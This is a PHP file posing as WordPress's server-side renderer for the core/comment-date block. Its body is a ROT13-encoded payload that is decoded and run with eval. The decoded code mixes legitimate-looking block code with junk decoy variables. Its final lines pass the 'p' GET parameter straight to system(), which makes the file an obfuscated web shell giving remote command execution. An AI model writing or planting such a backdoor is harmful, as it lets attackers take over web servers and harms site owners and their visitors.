<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbzzrag-qngr` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbzzrag-qngr` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Erghea gur cbfg pbzzrag'f qngr.
 */
shapgvba eraqre_oybpx_pber_pbzzrag_qngr( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['pbzzragVq'] ) ) {
		erghea '';
	}

	$pbzzrag = trg_pbzzrag( $oybpx->pbagrkg['pbzzragVq'] );
	vs ( rzcgl( $pbzzrag ) ) {
		erghea '';
	}

	$pynffrf = ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) ? 'unf-yvax-pbybe' : '';

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $pynffrf ) );
	vs ( vffrg( $nggevohgrf['sbezng'] ) && 'uhzna-qvss' === $nggevohgrf['sbezng'] ) {
		// genafyngbef: %f: uhzna-ernqnoyr gvzr qvssrerapr.
		$sbeznggrq_qngr = fcevags( __( '%f ntb' ), uhzna_gvzr_qvss( trg_pbzzrag_qngr( 'H', $pbzzrag ) ) );
	} ryfr {
		$sbeznggrq_qngr = trg_pbzzrag_qngr( rzcgl( $nggevohgrf['sbezng'] ) ? '' : $nggevohgrf['sbezng'], $pbzzrag );
	}
	$yvax = trg_pbzzrag_yvax( $pbzzrag );

	vs ( ! rzcgl( $nggevohgrf['vfYvax'] ) ) {
		$sbeznggrq_qngr = fcevags( '<n uers=\"%1f\">%2f</n>', rfp_hey( $yvax ), $sbeznggrq_qngr );
	}

	erghea fcevags(
		'<qvi %1$f><gvzr qngrgvzr=\"%2$f\">%3$f</gvzr></qvi>',
		$jenccre_nggevohgrf,
		rfp_ngge( trg_pbzzrag_qngr( 'p', $pbzzrag ) ),
		$sbeznggrq_qngr
	);
}

/**
 * Ertvfgref gur `pber/pbzzrag-qngr` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbzzrag_qngr() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbzzrag-qngr',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbzzrag_qngr',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbzzrag_qngr' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>